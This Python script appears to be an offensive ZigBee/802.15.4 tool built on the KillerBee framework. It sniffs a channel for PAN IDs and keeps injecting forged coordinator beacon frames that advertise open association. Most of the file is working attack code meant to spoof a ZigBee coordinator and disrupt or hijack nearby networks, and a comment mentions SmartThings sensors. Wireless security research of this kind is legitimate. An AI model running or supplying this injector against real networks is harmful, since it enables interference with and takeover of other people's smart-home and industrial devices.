#!/usr/bin/env python
import pdb
import sys
import argparse
from time import sleep
import threading
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # suppress annoying Scapy IPv6 warning
from killerbee import *
from scapy.all import *

# Jacked from killerbee project.
def randmac(length=8):
    '''
    Returns a random MAC address using a list valid OUI's from ZigBee device
    manufacturers.  Data is returned in air-format byte order (LSB first).
    @type length: String
    @param length: Optional length of MAC address, def=8.
        Minimum address return length is 3 bytes for the valid OUI.
    @rtype: String
    @returns: A randomized MAC address in a little-endian byte string.
    '''
    # Valid OUI prefixes for MAC addresses
    prefixes = [ "\x00\x0d\x6f",    # Ember
                "\x00\x12\x4b",     # TI
                "\x00\x04\xa3",     # Microchip
                "\x00\x04\x25",     # Atmel
                "\x00\x11\x7d",     # ZMD
                "\x00\x13\xa2",     # MaxStream
                "\x00\x30\x66",     # Cirronet
                "\x00\x0b\x57",     # Silicon Laboratories
                "\x00\x04\x9f",     # Freescale Semiconductor
                "\x00\x21\xed",     # Telegesis
                "\x00\xa0\x50"      # Cypress
                ]

    prefix = random.choice(prefixes)
    suffix = randbytes(length-3)
    # Reverse the address for use in a packet
    return ''.join([prefix, suffix])[::-1]


def create_beacon(panid, coordinator, epanid):
    # oooh, baby I like it RAWWWWWWWWWWWW
    print hex(panid),
    beacon = [
        # FRAME CONTROL
        "\x00", # FCF for beacon 0x00
        "\x80", # src addressing mode: short/16-bit 0x0002 (this is the only FCF flag marked)
        "\xd8", # Sequence number for 802.15.4 layer

        str(struct.pack("H",panid)), # 2-byte shortcode of panid
        #str(struct.pack("H",coordinator)[0]), # only some implementations make it 0000 "\x00\x00", # Source address 0
        "\x00\x00",
        # SUPERFRAME
        "\xff\xcf", # beacon interval, superframe interval, final cap slot, jbattery extension, pan coordinator (true!), association permit (true)
        # GTS
        "\x00",
        #Pending addresses
        "\x00",
        # bullshit zigbee layer packet
        "\x00\x22\x8c",
        # Extended PAN ID (Zigbee NWK layer)
        str(struct.pack("L",epanid)),
        "\xff\xff\xff\x00"
    ]
    return ''.join(beacon)


def get_spanids():
    spanid = threading.spanid
    canidate = 0
    restart_threshold = 0
    while True:
        try:
            recvpkt = listen.pnext()
        except:
            print "snag"
            pass
        # Check for empty packet (timeout) and valid FCS
        if recvpkt != None and recvpkt[1]:
            restart_threshold = 0
            try:
                canidate = struct.unpack('H',recvpkt[0][3:5])[0]
            except:
                print recvpkt[0][3:5]
                pass
            if canidate != None and canidate != spanid:
                # OK we got a packet, lets go back up and send out a beacon$
                print "Got beacon " + hex(spanid)
                spanid = canidate
                threading.spanid = spanid
        # BUG: There's an instance where the Killerbee Framework reads a packet generated by the smartthings motion sensor and *crashes* - we handle that here by assuming that if we didn't get a packet that the interface is busted and we should restart it.
        # TODO: Isolate the issue and file a bug
        restart_threshold += 1
        if restart_threshold >= 15:
            print "did we crash? Restarting sniffer interface...",
            listen.sniffer_off()
            listen.sniffer_on()
            print "restarted."
            restart_threshold = 0
    
def inject():
    while True:
        sp = create_beacon(threading.spanid, args.coordinator, args.epanid)#, args.devleave, args.coordinator, args.device)
        kb.inject(sp) #don't need str() anymore...
    pass

if __name__ == '__main__':
    # Command-line arguments
    parser = argparse.ArgumentParser()
    tohex = lambda s: int(s.replace(':', ''), 16)

    parser.add_argument('-f', '--channel', '-c', action='store', dest='channel', required=True, type=int, default=11)
    parser.add_argument('-i', '--interface', action='store', dest='devstring')
    parser.add_argument('-p', '--panid', action='store', required=True, type=tohex)
    parser.add_argument('-e', '--epanid', help="Extended PAN ID", action='store', required=True, type=tohex)
    parser.add_argument('-s', '--coordinator', action='store', required=True, type=tohex)
    parser.add_argument('-l', '--listen', action='store', dest='listenstring')
    parser.add_argument('--numloops', action='store', default=1, type=int)
    args = parser.parse_args()

    # Can't get the device to like context switching between listen and inject, so we have to have a workaround.......
    kb = KillerBee(device=args.devstring)
    listen = KillerBee(device=args.listenstring)

    d154 = Dot154PacketParser()

    kb.set_channel(args.channel)
    listen.set_channel(args.channel)
    listen.sniffer_on()

    coordinator = struct.pack('>H',args.coordinator)

    # I'm committing a sin by using the threading module to hold a shared state variable
    threading.spanid = args.panid

    getem1 = threading.Thread(target=get_spanids)
    getem2 = threading.Thread(target=inject)
    getem2.start()
    getem1.start()
    getem1.join()

# EOF
